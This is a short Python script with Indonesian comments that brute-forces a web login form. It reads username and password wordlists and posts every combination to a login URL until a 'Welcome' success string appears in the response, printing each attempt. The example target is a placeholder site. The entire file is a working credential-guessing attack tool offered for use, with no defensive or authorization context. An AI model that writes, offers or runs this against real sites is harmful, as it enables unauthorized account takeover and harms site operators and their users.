import requests

def brute_force_login(url, username_file, password_file, username_field, password_field, success_indicator):
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            data = {
                username_field: username,
                password_field: password
            }
            response = requests.post(url, data=data)
            if success_indicator in response.text:
                print(f"[+] Login success: {username} / {password}")
                return username, password
            else:
                print(f"[-] Failed: {username} / {password}")
    print("[-] No valid credentials found.")
    return None, None

if __name__ == "__main__":
    # Contoh penggunaan
    target_url = "http://targetsite.com/login"
    user_file = "usernames.txt"
    pass_file = "passwords.txt"
    user_field = "username"
    pass_field = "password"
    success_text = "Welcome"  # Teks yang muncul jika login berhasil

    brute_force_login(target_url, user_file, pass_file, user_field, pass_field, success_text)
